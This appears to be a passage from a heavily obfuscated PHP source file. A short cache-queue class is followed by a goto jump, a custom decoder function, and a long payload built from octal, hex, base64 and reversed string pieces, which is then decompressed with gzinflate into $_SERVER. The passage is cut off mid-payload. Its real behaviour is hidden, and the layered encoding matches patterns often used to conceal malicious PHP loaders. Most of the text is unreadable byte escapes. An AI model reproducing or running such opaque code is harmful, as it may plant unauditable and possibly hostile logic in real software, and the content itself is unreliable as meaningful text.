$‡Š¨àöå[$éš½ØáÄ[462]] . $éš½ØáÄ[1771] . $ù¤«õûÑ, $éš½ØáÄ[1769]); return !0; } public static function count() { $òòŞõÍ² = Cache::get(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_LENGTH); if (!$òòŞõÍ²) { return 0; } return intval($òòŞõÍ²); } public static function getAll() { $®ß’Á²” = Cache::get(self::QUEUE_DATA); Cache::removeMemory(self::QUEUE_DATA); if (!$®ß’Á²”) { return array(); } return $®ß’Á²”; } public static function setAll($†Íë½ş¢) { $é–ÂìšÎ = 3600 * 24 * 30; Cache::set(self::QUEUE_LENGTH, count($†Íë½ş¢), $é–ÂìšÎ); Cache::set(self::QUEUE_DATA, $†Íë½ş¢, $é–ÂìšÎ); Cache::removeMemory(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_DATA); } public static function clear() { self::setAll(array()); } } goto c¡Ä¶¾ÖÙ÷; f„ùÖéØÑ: if (!function_exists('_kodDe')) { function _kodDe($str) { $str = base64_decode($str); $l = strlen($str); $result = ''; $offset = ord($str[0]) - 30; for ($i = 1; $i < $l; $i += 2) { if ($i + 1 < $l) { $result .= chr(ord($str[$i + 1]) + $offset); $result .= chr(ord($str[$i]) + $offset); } else { $result .= chr(ord($str[$i]) + $offset); } } return $result; } } define("\334\216\251\273\222\267", "\263\322\201\342\276\314"); $_SERVER[Ü©»’·] = explode("\174\1\174\5\174\5", gzinflate(substr(strrev('lÙÉ#%‘Ùe‘\'+8µØ!ƒòÒÚ'."\n".'ZYùK(ÕÕx	}Å'."\0".''."\0".''."\0".''."\0".''."\0".''."\0".'‹')."\63\31\111\43\171\154\111\43\153\106\336\222\120\166\12\51\204\22\112\131\302\16\55\55\55\1\312\366\3\1\112\241\175\55\205\26\50\133\151\130\263\260\57\245\345\147\151\341"."\335\345\334\145\106\62\374\357\173\357\373\136\40\321\334\163\367\355\334\163\316\75\347\334\277\237\165\345\365\67\334\264\156\367\165\173\255\333\353\307\257\276\360\311\373\267\322\357"."\165\173\242\377\366\240\337\107\156\330\147\67\362\347\340\15\347\64\64\164\317\337\257\51\372\265\215\267\375\122\373\217\366\237\174\364\320\155\177\334\374\227\227\376\370\363\144\146"."\361\335\233\163\107\354\166\172\343\341\115\255\50\51\315\331\112\177\224\242\151\53\372\204\141\331\26\5\244\315\142\326\310\321\157\243\110\177\375\364\247\57\36\51\353\5\323\326".base64_decode('adBHf1RoFfnXGs0bLF6NxpJqoq+3NxRPQqJWOb5gZuCrpJW1AtRf0ssWao1cnFoy').base64_decode('S3rRARGAjGZrKc2Ckjra1Y5QbyS2Sk2u6g1BipQ6WtHLkzREPhO2VraTRkHnKcbL').strrev('1F«¯/µ=]ÆôÇU—i,xğÕ“„ôõŒ¢Ç˜ DÑÆITp®¡í]¼').strrev('6T rZ0òU«=_å4óä¬TÓBÿ$¯‚Y=k‹?C>zt~‘¥Ìhk(6k')."\12\32\353\364\62\175\222\103\351\207\126\261\115\243\230\246\201\320\204\135\326\4\34\265\65\215\46\132\57\102\121\211\120\44\24\114\52\270\201\112\147\74\326\243\300\44\24\64"."\313\326\313\312\212\356\120\74\244\340\106\267\325\223\276\326\53\260\136\242\150\50\224\100\44\242\114\127\202\255\27\112\254\30\232\247\106\141\261\170\107\50\256\264\257\122\304\10"."\245\315\102\301\54\372\120\51\150\46\155\251\251\241\170\234\176\170\140\171\107\302\170\322\40\20\353\354\114\204\170\10\72\167\102\4\265\144\16\254\117\107\50\223\315\333\352\230"."\226\257\260\145\72\102\177\353\341\7\176\115\13\226\356\250\121\64\52\260\114\241\10\323\344\333\12\76\52\54\265\316\40\172\6\76\12\50\277\11\73\17\155\303\61\372\331\266"."\x98\xfe\x2e\x84\x44\x29\x15\xc7\xe9\x65\x5b\xd5\x8b\x69\x33\x63\x14\x61\xb3\x2e\x81\x45\xa7\xd9\x43\x1d\x65\x3\x25\xa0\xe1\xac\x99\xcf\xb0\x6f\xcb\x98\x82\xae\x64\x8d\xbc\x1e\xad\x14\xe4\x24"."\74\230\36\62\362\231\62\333\137\137\224\222\6\43\174\273\342\264\42\124\102\55\341\73\335\310\116\212\375\146\231\225\162\132\17\243\35\41\362\365\362\324\263\40\221\156\333\250"."\x73\x30\x36\x86\xd9\x57\xca\x9b\x5a\x26\xa1\x97\x79\xd7\xc\xb3\x13\x65\x8c\x55\x6c\x19\x58\x21\xc9\x3a\xcd\x72\xa1\x3\x61\x6\xa8\x1f\xed\xa\xa3\xaf\x46\xc4\x8\xdb\x17\x19\x69\xc4\xfc\xd"."\375\247\170\77\33\354\137\212\376\151\4\324\67\0\155\32\322\363\171\125\237\320\141\343\24\62\363\54\66\30\176\53\145\24\375\10\102\203\341\230\72\244\131\103\75\231\171\52".strrev('2Eã˜®€‘àÌ^„¥Ûd=úEÜ¼µ¦o9xIÓQt<l,pFù«°J†•ğŸFj0ÅÉ')."\122\45\135\207\104\35\36\45\243\364\50\253\224\356\126\243\325\142\31\13\171\376\305\172\307\141\26\7\332\23\154\72\63\131\372\221\142\307\102\35\124\150\130\4\303\211\355\251".base64_decode('lUp5I63Zhln0m2lbt72WXdY1KDGQTuuW5Q2aRbts5r2BfN4c98bKRs4otiozAdmi')."\x48\xb4\xa9\xbd\x18\x1\xb6\xc2\x4e\xad\x5b\xa8\xe0\x85\x82\xab\x99\xd9\x56\xb1\xb3\xde\x16\xb6\x3\x79\xea\xb2\x56\xb4\xb2\x7a\xd9\x1b\x82\x9d\xd1\xaa\xa0\xc6\x72\x2c\xc8\x92\x75\x18\x56\xc9"."\264\14\334\274\126\105\263\155\55\75\204\61\210\50\276\355\13\322\33\305\274\121\324\253\322\206\46\112\106\131\267\130\133\225\256\236\44\24\202\112\327\275\275\145\55\127\320\132"."\225\122\45\205\106\6\166\152\15\30\115\15\103\323\252\244\161\320\243\24\52\226\355\55\353\10\25\31\350\270\203\101\16\147\275\75\170\137\31\172\306\233\100\30\33\300\163\232"."\347\52\150\351\50\54\216\102\273\223\311\136\65\334\211\216\344\150\110\355\11\44\203\335\320\154\133\313\261\66\107\20\36\346\105\62\340\112\57\332\137\170\161\105\121\137\5\260"."\xd7\x1c\xd7\xcb\xa8\xe2\xf6\xc9\x56\x65\xc4\xcc\xa4\xcc\x9\x1f\x8b\xc2\x89\x13\x8\xd1\xb0\xc4\x78\xba\x4b\xb6\x37\xae\x15\x73\x78\x7c\x52\x93\xb6\xe\x4b\xd0\x1a\xcb\x39\x7\x3a\xa2\x17\x73".base64_decode('9hDLmAjFl4fiaiLWmVwRiMNhXkSrZIJVhYvOe+N6Bg192mb5tBIeNZYGbw48VywW')."\x6f\x18\x16\x17\x9\x77\xe1\x81\xe9\xf0\x5a\x28\x91\x57\x4e\xc5\xca\x8e\x18\x5\x3\xb7\xdd\xe6\x31\x64\x24\xd1\x49\xdf\x5\xd\xf2\x93\xe\xb5\xd\xc\xcd\x6c\x18\xc8\x34\x35\x7a\xd1\xbf\x33"."\33\373\7\72\174\63\7\227\370\15\221\307\77\313\67\113\231\335\74\137\351\105\244\207\241\345\25\350\164\125\212\146\45\266\314\71\54\142\65\27\315\242\376\5\203\203\317\56".strrev('ÑÈ8+)Õ†¨şwfgôı·¬¶İ&"¾'."\0".'Pö :ÇvJÚ¤‰Bú¡ã•†»Ûi').strrev('ZË7™´´¸xÁ'."\r".'ÈİnÁÀLì20­TqÖYPãåœ´)fÇèôdÑ†¦j').base64_decode('HmNGtil0hq1yBmArQMIikDAKJdZYe6hSSEmfgO0ttH4YLhsy+XlmluGr1Q8JZ8zu')."\144\330\336\237\230\203\376\27\250\75\143\26\64\206\50\11\212\323\63\24\307\121\320\114\107\114\267\256\211\103\332\56\333\46\206\226\35\111\320\200\16\231\60\261\71\235\65\251".strrev('i<Ø'."\0".'±äÀ¯:‘‰Ê8¬6|â ‡µÎ|²¬|sÍ!:óÑ™ZÆÛÂ')."\x50\x31\x32\xe3\x22\xdc\x5b\xd6\xb3\x6\x6c\xd2\x22\x9a\x91\x1e\xad\x3c\xc2\x7a\x83\x66\x40\xac\x15\x1c\x90\xd6\x51\x67\x5f\x24\xa2\x6\x63\xd1\x24\x22\xa9\x29\x64\x45\x3c\x9c\xc\xb1\x75\x1b"."\xe8\x50\x3\xc1\x5e\x7e\xf0\x8a\x19\x85\x4\x18\xc1\x54\x9f\x1e\x14\x32\x36\x1b\x1a\x8e\x9a\xe3\x17\xc7\x1c\xc2\xd8\x25\xb3\x68\xe9\xde\x34\xe4\x10\xa4\x77\x55\x54\x46\x9c\x2\x80\x67\xc4\xc9"."\xe1\x3a\xc\x26\xbc\x5a\x61\xca\x5b\x40\x5b\xc0\xcb\x1b\xea\x3c\x83\x95\xa4\x7c\x94\x87\x61\x96\x4\x72\xc7\xc3\x88\xb8\x22\x76\xf8\xf7\xc6\x12\x90\x61\x9\x86\x22\x2\x2c\xa5\x97\xa1\xb2\xde".base64_decode('PogqSCukKwTA/dh5rgFZFViRYIi5gtKXjSlNdGkJaw/rSCEv6Dlnr7xi5JPd4egy')."\xb5\x27\xd6\x11\x8a\xa8\xe1\x28\xc2\x4c\xc9\x6a\x78\x5f\x6f\x47\x80\x4d\xa5\xc\x6f\x8f\x25\xbb\x1d\xd0\x3e\x84\x9b\x96\x7\x22\x61\x77\xf2\xd0\xca\x70\x22\x99\xa8\x19\x85\x60\x7d\x21\x57\xc"."\142\4\173\343\241\316\360\112\36\354\14\207\42\35\11\65\30\10\166\213\64\321\100\17\4\324\54\146\305\54\277\63\275\212\220\154\202\63\164\352\30\146\116\331\140\251\16\36"."\112\145\334\201\52\326\20\72\114\165\130\151\320\135\314\22\223\236\0\103\234\66\53\354\10\340\204\144\201\341\210\202\6\233\110\143\7\145\3\375\151\124\2\11\305\56\251\34"."\x1b\xa4\x26\xf9\x27\xe9\x6\xb\x23\x92\x11\xea\x57\x0\xe1\x57\xb5\x40\xc5\x69\xda\xf5\x2c\xc7\xc3\xb5\x1\x81\xac\xcd\xd1\xbd\x2b\x8c\x16\xbf\x88\x43\x33\x10\x20\xbc\x37\x5a\x9\x64\x46\xa0".base64_decode('GgNtpbIdYM3JCr5XjfWG4gHMNasr4rFoF2QYH9JZA8Iw/A2MuALm2RYICVFGGuOi').base64_decode('xKAPm2wo19GfY+kPIgqhcr3IRj2FcTM7XdhHFu0GhlfNCq8tZZp5tk8RfcARBme+')."\207\55\266\110\46\30\252\151\142\7\24\234\17\311\330\262\120\124\145\53\213\206\244\325\110\1\210\235\215\305\141\100\154\163\204\361\144\64\62\36\112\260\135\136\326\107\53\6"."\x1b\x2e\xbf\xaf\x9\x56\xb1\x8e\x8e\x20\xa8\xde\x7f\xe2\xc0\x78\x53\x43\xbf\xb7\xc9\x37\x88\x3e\x1a\x67\x2e\xa5\x41\x8\xd\xf8\x1c\xc1\x63\x20\x7f\xa5\xcc\x73\x63\xb2\xa9\xc1\x5a\xd2\xd8\x3a".strrev('ZOcŞ’ÀÛOÑ£’á(ã×s=³µÁ€Ø×Ài°ww³Tï4§xíi,7ğà')."\263\264\177\140\260\276\265\351\250\1\337\321\3\343\203\63\33\227\260\172\322\225\62\342\67\323\223\274\251\231\246\6\324\44\104\116\361\44\105\202\362\244\4\54\142\312\50\11"."\xe8\xda\xf9\xeb\x19\x1c\xcd\xa1\x9e\x13\x39\xfa\xbd\x3\x4d\x83\x4b\xa4\x7c\x12\xc8\x5d\x17\x22\x97\x10\xfe\x1d\xe2\xe9\x2\xde\xd5\xb8\x67\x3c\x2b\xde\xf7\xb0\x3e\x2a\xc5\xb4\xc0\x9e\x78\x5f".base64_decode('pLQ04AEjV+RbCJ3pnE93UvFrZ9Df9Wwic/oEQw3FrFGG1VkpGqNMDFHUR+HDtNn6').base64_decode('Tun2uM6WB4I7wmhxMNYRRUmhPCEMoQbMUPE1yheTUVIxhTXOQxm9CPO0L6S20lpJ')."\117\110\75\124\325\144\240\75\22\122\31\206\1\114\314\302\4\53\266\163\221\35\352\232\300\250\14\77\244\5\11\117\270\25\330\371\326\150\136\41\210\101\321\313\145\263\334\112".strrev('K	§˜1¡,!/áA5WœÛs:1¤ \'•Oä:‹m+ÓÄlhÙ™Ä3I„¥V—¤')."\x42\x11\x15\x21\x5b\x15\x88\x3\x40\x3d\xed\x81\x44\x38\xa8\xf6\x6\xd8\x91\x86\xf8\x60\xbf\x95\x19\xb1\xfc\x5a\x39\x3d\x64\x8c\xe9\x11\x23\xe5\xc7\x42\x2\x2c\xb3\xf4\x71\x36\x7a\x2e\x34\x66"."\x48\x4f\x8f\xa8\x5a\xa\x75\x85\x11\xf0\x15\xcc\x6b\xb2\xe5\x44\x10\x28\xc0\x4b\x62\x1\x59\x88\xde\x63\xc4\x97\xbf\x61\x60\xa0\xd2\xaf\x67\x6\xfb\xd1\xbe\xd4\xbc\xd9\xc1\xb5\x73\xd6\x37\x32"."\46\304\77\200\376\260\100\240\206\230\117\345\310\132\105\344\203\17\17\23\227\364\70\2\74\232\6\315\62\247\340\112\16\32\337\66\155\55\357\50\42\211\41\14\163\62\272\2"."\144\36\164\61\106\4\102\305\224\206\44\37\45\330\76\312\145\14\134\164\43\11\350\160\216\204\156\373\170\12\217\24\251\242\260\103\126\335\126\307\46\263\210\166\173\120\72\211"."\251\344\51\61\151\331\172\301\41\124\265\164\74\223\235\225\174\336\346\234\106\336\30\201\32\140\53\203\214\327\13\207\125\123\255\254\235\146\231\61\354\63\241\31\165\63\153\45"."\14\27\213\210\275\226\167\202\240\1\272\2\210\332\112\52\15\114\36\251\204\243\112\173\54\26\11\5\242\12\46\67\340\230\104\264\114\42\324\33\100\147\54\146\375\23\311\20"."\210\110\303\35\136\126\356\112\157\30\30\100\376\141\300\260\233\45\214\340\124\64\46\52\142\264\106\330\134\42\174\155\263\244\40\316\203\20\246\203\75\130\200\345\301\204\220\7"."\xf5\xc1\x83\xb7\x92\x47\x30\x19\x1e\x21\xf\xf4\x8c\x19\xfa\x38\xf9\xe0\xbc\x80\x7\x58\x4\x8f\xad\x95\xd1\x16\xc3\x34\x3c\x7c\x86\x3b\x3c\x86\xd5\x41\xf8\x1b\x52\x1\x89\x62\xd\xb2\x87\xb0"."\230\46\257\115\172\150\343\42\372\230\236\367\260\246\171\130\213\75\214\165\365\20\176\263\3\232\325\207\66\27\64\213\174\42\24\77\344\301\313\11\257\146\217\220\127\172\314\361".base64_decode('ol4mSWCYBGvkEWyTJ1c2K6VeVqcUos0CgGgzB8RN0/YwVtgjc8nQigDbNTWHs3Zv').strrev('&6§Pî1¶.Zø€OES^˜#²Gg¬9D´µœ>z«&KéGª£‡s»øÈ').base64_decode('r7xaq5AhV7aMhXBSiKUFoe5mgN0Ca1xpUsslpOpsLcfqwqgMxU6blH7H9fRkWnDU')."\x1d\x12\x9f\xee\xc\x39\x37\x57\x5\x95\x97\xd0\xb2\xae\x4e\x7a\xc8\x2e\xab\xb5\x43\x6a\xaf\x0\xbe\xea\xf9\x84\xed\xb7\xef\xbe\x6c\xc4\xd9\x56\xe0\xb3\xef\xd8\x41\x5f\xbe\x77\xa1\x97\x4\x5d"."\xc6\x4a\x82\x1e\xa2\x8d\xc5\x28\x3b\x81\xe\xb5\xce\x3c\x1b\xa2\xd9\x72\x34\x20\x6b\x8f\x33\x84\xb7\x9e\x8f\x20\x6f\x72\xeb\x93\xe0\xa2\x97\x48\xa8\x33\xa9\x1c\x1f\x43\x98\xce\x30\x55\x9a\x47"."\xc5\x89\x15\xf2\x8f\x59\x54\x1c\x65\xb3\xe1\x52\xda\x48\xbc\x8\x6b\xc5\xc\x85\xac\x41\xa7\xc2\x9a\xb6\x3a\x56\x49\x9d\x23\xbb\x58\x34\xce\x46\x78\x58\x50\xa9\x5e\x86\x78\xb8\xe5\x41\xc0\x8b"."\x83\x74\x5f\x9c\x64\xc\x14\x13\x7\x67\x5\x88\x58\xcd\x2\x76\x12\x4b\xf1\xe1\x4b\x67\x30\x31\xb5\xf2\x2a\x95\x90\x91\x0\xb0\x76\x39\xea\xc5\x41\xb1\xc3\xd8\x92\x50\x70\x5\x1e\x89\xec\xc2"."\x8\xc7\x2b\xf6\x8a\x14\x74\xe\xb9\x6b\x45\xba\x8e\x5b\x3c\x44\xbd\x46\x71\xd2\x28\xca\x2\x37\x1\x15\x27\xb6\x20\x18\xf0\x56\x77\x89\x8\x3b\xa6\xfb\xa6\x47\x8c\x10\xe8\x79\x40\xd0\xe7\xc1".strrev('” ˆ“‰ŒBFpÉƒVüV»'."\r".'Õ•qB%÷N…ÒËudÑ'."\n".'Û¡=ji˜t“$')."\x2c\xab\x8d\x9\x62\xc6\x91\x47\xc2\x2c\x96\x3d\xc9\x5a\x2f\x7f\x3a\xb\xa5\xc1\x8e\xe9\x2\xdd\x5c\x4e\x53\x2b\x28\xe3\x29\xc3\x8a\x8\x72\xd3\xf1\x4d\x7a\x9a\x34\x6b\x6\xb1\x2c\x90\x7d\x53"."\142\201\137\171\242\111\150\140\110\5\210\21\125\222\170\160\244\344\304\170\264\111\1\176\0\240\143\25\35\212\364\33\261\46\171\164\26\226\175\170\17\165\341\23\115\76\114\234"."\4\111\102\107\33\6\362\211\322\22\125\161\162\152\41\355\302\207\203\70\114\330\130\213\55\50\306\137\354\67\307\122\311\211\326\141\34\256\126\67\12\57\367\332\341\316\262\311"."\xa9\x66\x4e\x24\xb8\x13\x5\x9\xd7\xcc\x2f\x5b\x5d\x7\xbb\x34\x38\xe\x62\xa4\xa\x24\xe5\x71\x93\x25\x2e\xa8\x2b\x28\x66\xc5\x71\x2a\x51\x10\x93\x90\x6b\x99\x82\x51\xf4\x95\xe9\xd9\xe7\x43"."\314\6\134\220\173\232\45\312\115\40\245\265\26\71\105\340\254\134\357\232\164\333\64\21\203\135\366\225\121\315\242\101\22\102\4\154\102\356\117\361\241\51\323\33\274\24\13\105".base64_decode('SKjdSVaxnImSxrYF8CcVXg2nAQGnGekRsZW1McTcMfxLOiNaSsMRTkZjTBPKGDaG')."\xe0\x83\xd4\x64\xe2\x7c\x91\x50\xba\x34\xe7\x30\x19\xc1\x93\x73\xaa\x6a\xf2\x5\x4f\xe2\x99\xe1\x48\xe9\xa4\x34\x0\x38\x93\x10\x0\x3e\x41\x18\xc9\x3a\x3\x69\xb3\x4\xeb\x40\x52\x91\x29\x98".base64_decode('Y7oE9Fm2WRIxUpBGS1GiUCkVnxrSDrTFMoSoFgNF0kJeIj6gu9iHORKfjMsD5TJb')."\266\264\163\370\36\12\1\145\20\306\200\11\266\347\152\35\151\264\360\320\230\120\200\241\105\341\212\175\24\3\370\264\114\46\306\356\342\344\357\352\244\262\50\265\166\101\104\33"."\211\27\45\205\152\47\17\344\363\102\203\301\35\236\66\13\335\354\162\46\31\62\155\266\116\302\34\63\201\104\55\30\147\204\344\315\346\44\346\205\50\305\115\364\73\361\366\364"."\4\316\64\110\116\114\150\355\60\242\11\202\103\106\121\267\370\321\136\266\152\341\254\377\317\224\164\365\34\340\275\62\335\302\301\161\222\370\35\253\344\215\71\316\161\56\143\26"."\x28\x4b\x22\x55\xc8\xb1\xaf\xda\xe\x22\x2b\x4e\xca\x90\x36\x8f\x63\x3d\xa0\xcd\x4a\xfb\x8c\x8f\xa5\x70\xc\x6d\xc6\xda\x2b\xd4\x9d\x4e\x67\x52\x76\x82\xe7\x26\xf8\xd1\x2a\x67\xc2\x51\x78\xbe"._kodDe('MBmUtYKw4S/ylRUZMTUBRTp5+pPU5Mp5mW1cAuLr6CHgzH3N4cCF890voVlhjMtl1g==').base64_decode('T/ottCzPWLnWPOx33+j6of+Vh+646oajes65sGF+RTvngLMPmhE/ZsZz5Wt/8/fi')."\xbb\x13\xaf\xbc\xf0\xf6\xa8\xb9\xf1\x80\x87\x3f\x3f\xb4\x70\xf0\xae\x8d\x87\x34\xbe\xb1\x47\xe5\xf1\x6b\xe6\xad\xbe\x6a\xaf\xbf\x3e\xbb\xfb\xea\x63\xba\x4f\x3d\xe9\xb2\x37\x7e\x68\x3e\xbe\xf5".base64_decode('+d9tCy+v2+evlz/33NZLnntx0fLn6s22jx/fdKfn9L13q7zccvLiR79+1dn7bm9a').base64_decode('M7vjxtP65qh/uOzUVye3PbDDOmCviy6/9MYZn9256cBnH5p4KHfhsxfttW99/MpH').strrev('»à©‘å¿Û£Í²ü{yl¶§¿ësÿwı½-MĞâwºXn.ÿùûılì½‡ôØö').strrev('ÛvÜ·©ö»¯ãÆEá£øÜ¯¦êø:~Ğ>d×ğø®¿÷üÿûıZÅş˜ôY¬W').base64_decode('MU3vHfX7aL7l0dTGvz77z8TylxPWyublf7/x43lzjtrY/EGP/8+V1z7d/PbzT599')."\xc5\x9c\x65\xf\xc7\x1f\xef\x9e\x9a\xf7\xc8\x59\x17\xbd\xfd\xe4\x99\xe7\x5e\xf8\x5f\xa5\x54\xcf\x3f\x9f\xd8\xed\x90\x8a\x75\x89\x35\x7c\xf8\x57\x76\x9e\x5f\xba\x33\x77\xf5\xe2\x87\xfa\x5f\x19"."\32\117\55\230\334\172\357\36\127\235\370\255\371\217\255\337\357\362\261\353\266\174\264\356\241\347\366\372\172\344\211\171\257\275\371\312\327\366\71\367\215\3\337\270\166\346\374\323".base64_decode('v//Owb8KPrv+tWTD19Z975yzH9///ANHrzrsvUuMg6+c//DvfrLbUQesvPmMb7Yf')."\xb3\x61\xfd\x68\xc7\x2d\x3f\x7e\x28\x9b\x88\xfd\xb0\xef\xf5\x59\xd1\x62\x7c\xef\xd1\x4b\x97\x6e\x58\x10\xbe\xeb\x77\xbb\xcf\x7f\xe3\x4f\x6d\xfb\xea\xbf\xb9\x65\xdb\x67\x7\x1e\xff\xa6\xe7\xcc"."\377\334\262\141\326\271\373\377\344\53\17\336\261\367\365\13\317\74\371\201\305\57\234\362\315\323\337\273\355\117\117\37\164\330\247\17\234\363\354\23\303\255\177\273\155\377\140\261"."\362\262\175\345\340\350\236\107\7\117\274\150\115\337\42\377\231\343\17\216\355\331\373\354\3\17\355\336\76\271\147\154\360\364\123\106\63\153\373\62\301\377\156\275\107\137\170\307"."\366\203\326\74\365\320\37\52\137\337\264\365\261\310\133\73\237\371\333\31\237\14\164\205\77\330\364\326\314\123\117\356\276\363\245\306\340\121\371\347\336\151\170\364\271\131\313\17"."\272\342\253\317\34\354\213\57\272\376\274\127\354\257\144\353\136\277\373\325\307\77\276\354\274\347\366\331\264\251\371\364\75\117\377\370\326\354\247\153\116\216\117\354\277\145\316\175"."\225\307\322\347\375\166\305\353\207\237\261\354\310\275\73\316\152\273\341\340\356\55\326\324\371\147\176\173\174\375\325\327\237\377\333\3\176\271\362\153\165\347\335\375\363\246\77\256"."\154\175\60\326\275\374\254\371\263\157\72\371\375\236\177\135\261\267\175\361\135\67\67\375\361\133\233\227\36\362\352\315\173\107\16\365\76\275\355\331\171\255\143\75\317\37\164\116"."\xe0\xf8\xc2\x33\x6f\x9c\xfd\xda\xfc\xc0\xc9\xf1\x99\x1b\xae\x7b\xf8\xe0\x55\xc3\x1b\xfc\xcb\x4e\x3e\xfc\xa8\x3b\x37\x76\x1d\xe4\x99\xf5\x48\xdf\xbd\xd\x9f\x7d\x34\xf7\xf8\xca\x53\xa7\x7f\xfd"."\342\137\377\342\262\357\77\165\343\334\175\314\173\347\74\344\133\67\247\355\301\7\3\312\361\127\356\333\163\315\137\276\173\375\372\31\317\35\262\152\375\326\47\106\226\337\36\275".base64_decode('/v5L5q64ZuMHx57/0R/fuXth+PFZV81s/OzY98565tBZAxf/dd3sZPmB5uTXD1x7').base64_decode('W+ZwfW39HV//9I4/PLj56hN++/gNJ9/y9llrvvHdp8YuvWf19U8NHzn86Pxdhz/9')."\xcc\xed\xc5\x7b\xb6\xdd\xbf\xfa\x8a\x3\x4b\xbf\x3c\xec\xf8\x8b\xfe\xd7\xe3\xa7\x24\x17\x1c\xf9\xc8\x8c\x9b\xbf\x7d\xc1\x1f\x17\x9f\x70\xd2\x8f\xae\x3e\xaa\xdf\xea\xab\xdb\xff\x2f\xed\x37\x54"."\216\374\351\243\75\253\36\334\153\352\157\335\337\171\341\345\173\137\277\264\175\173\360\345\175\136\276\72\22\377\371\235\67\336\64\171\162\356\240\267\316\73\155\333\57\316\333\272"."\xe0\xcd\xb9\x67\xce\xdd\x70\xf1\x55\x6f\x76\xd5\xff\xf6\xa9\x5f\x5c\xa2\x26\x7c\x3f\x3d\x2e\x3f\xf7\xc2\x7f\xdc\x3e\xe3\x5b\x27\x1c\xf2\xda\x71\x85\x7f\xbc\x77\xc8\x5\xff\xfc\x78\xff\x1b\x83"."\157\75\160\363\237\267\335\374\326\322\375\356\170\171\321\127\256\377\274\255\156\164\333\335\167\274\165\322\347\361\267\263\277\172\360\262\364\241\321\73\32\377\66\371\373\213\353\232"."\137\236\375\324\176\67\77\347\355\336\347\130\163\303\266\123\274\247\375\345\203\224\376\235\307\137\351\332\57\271\375\127\217\14\357\70\71\170\372\223\317\277\175\351\130\357\273\37"."\46\57\13\135\265\357\331\35\117\147\357\177\361\361\273\377\331\271\265\377\335\375\366\77\363\201\212\76\63\377\316\207\237\170\216\275\355\215\254\76\176\347\13\307\247\72\167\213".base64_decode('nTH3wdalC9ccsuuiO0/5+KUxbVVXy4HHeg5/cdv8pY+2fOe8ax5OfePsN+488Mb1')."\352\346\337\75\372\352\243\273\332\77\272\374\323\173\375\306\31\107\256\176\257\253\275\170\312\67\327\227\226\134\35\334\373\306\375\126\254\71\162\346\41\217\56\34\137\360\357\227".base64_decode('7igectGGpg1fXTb+rXceOnv3C767MHj7gamxz97M7freJw/vuPH+wftOmnr/xz99').strrev('üŸ¯GÉm8>#…å~TÒ=ïgßñølÏgŞşn\'«ôÿÚërŞ?µÏò£{í±')."\xb7\x4f\x57\x3d\x61\xae\x5e\x77\x6d\xe3\xc1\x89\xde\x83\x2\x57\x54\x8e\xd2\x77\x3b\xe2\xa9\xe0\xd2\xeb\x7e\xa3\x1e\xd0\xdf\xbd\x6a\x4b\xe6\xe8\x6f\x2f\xf7\xed\x7e\xd8\xa9\x45\xfb\xd5\xdd\x76".base64_decode('X39I9vIzXjt/9Vv3N6m5bU8dePCnh/zkk5FbvvtT7/UXtN/y0nXfmHld7wW/H7z1').base64_decode('fv+GDccX91t+wNesf7V88M6DT7z/xLbQLzcfvO8dvQOLT1y5+m8vDP9jWH+yJfzt').base64_decode('7z46vq7QsOf5vzl27e2fPPxyz6zOk+bdOnjIf7w69euN664/e/sl31iemX3rEbfc').base64_decode('0bJwzUn7d/QddE7dgWN1+dzAOXfl/3JSZtXhaz/Ymv7rVxcdcPCld3z1t0tf+l3L')."\x9f\xbf\x73\xf3\x3f\xae\x79\xec\xec\xb\xce\x6d\x6e\x79\xee\xb7\xcf\x9f\xf4\xe4\xd9\x1b\x1f\xd9\xf5\xec\x9f\xe\x58\x37\x71\xdc\x3e\xb1\x9d\xed\x97\x3e\xbb\xc2\xb3\xe3\x1f\x93\x8f\x7e\xe7\xc8"."\315\347\257\132\374\314\310\136\247\375\54\172\304\362\67\272\316\375\365\362\5\173\346\176\172\326\326\65\133\356\76\256\351\27\167\336\31\135\26\312\65\237\370\346\235\177\175\152"."\153\347\171\163\377\174\322\171\107\54\376\143\156\363\373\366\374\167\212\177\371\364\322\25\346\137\16\374\343\17\126\130\357\74\275\363\17\235\317\134\267\255\355\263\313\157\177\176"."\xd9\x86\xaf\xee\x58\x1d\xbc\x70\xfd\xf1\x67\x24\x56\x3d\x78\xc4\x1f\xae\x38\xe3\xf2\x3\x9f\x59\xfc\xe1\xba\x1d\x5f\x19\xd9\xd8\xf0\xe6\xc1\x73\xb4\x1b\xdf\xdf\xd4\xef\xf9\xd9\xcd\x1b\xf6\xd0"."\364\373\306\367\70\366\201\147\316\176\373\204\125\327\16\266\15\254\134\267\42\331\71\72\360\321\165\373\274\30\335\373\27\77\137\366\351\31\253\57\212\355\376\263\345\137\131\176"."\313\206\235\317\316\355\233\271\371\326\337\355\375\334\356\35\35\327\377\176\152\362\351\153\17\134\264\173\335\41\173\7\156\235\361\342\303\311\102\145\335\310\151\157\137\261\107\343".strrev('?ïÁî°Ö_7ÙÛSƒê{!Mq}®WÛWíº½ÑÔ~\'=¨àºîoìó¶5K')."\172\305\213\321\213\177\335\63\174\317\377\272\350\224\277\137\121\212\34\272\144\353\124\377\117\126\77\235\237\267\165\237\347\173\36\351\373\323\77\336\74\40\325\262\251\160\300\346"."\xc9\xef\xef\x7b\xce\x63\xb3\xf\xcb\x36\xed\x59\xd7\x9d\x38\x65\xf7\x81\x93\x77\xde\xf7\x76\xee\xb9\x85\x4f\xf4\x5c\xd3\x3a\xfc\x2b\xfb\xa9\xaf\x75\xfe\xfb\x80\x2b\x1f\xfb\xfd\x9a\xd5\x73\xcf"."\xb9\x7b\xf7\x3f\xdc\x38\xba\xb9\x6f\xf7\xaf\xae\x1a\x1d\xbd\xf5\xcf\xdf\x3a\xe6\x2d\x7d\x75\xe4\xba\x13\xfa\x6f\x3f\xbe\xd3\xb8\x39\xfe\xe4\x8a\xc1\xe1\xed\x77\x5c\xfa\x64\xd7\x61\xff\xf5\x64".base64_decode('2+rF+5369cUtK+88Yse93+y9edne/f0/euzQnkdW3njnYenYYY/1LH/ot2tnvHr1')."\75\332\143\321\275\326\35\355\371\366\71\227\75\177\173\347\144\141\364\365\217\126\376\345\227\115\315\37\256\277\56\265\155\376\256\113\367\76\370\343\276\331\7\155\323\102\147\316".base64_decode('PvL5J5YuHvvo5guW7d7if/2mgW/Z/m/usba84sQfXHP7s003/OOoQ0Ozzql/89ZP')."\x5e\xf8\xf9\xa1\xcb\x86\xcf\x5a\x34\xd2\xf3\xb3\x3a\xfd\xe1\xfb\xe3\x17\xf5\x45\x2f\x78\xce\xf7\xc6\x59\x89\x9f\xf5\x3c\x7d\xf6\x86\x5d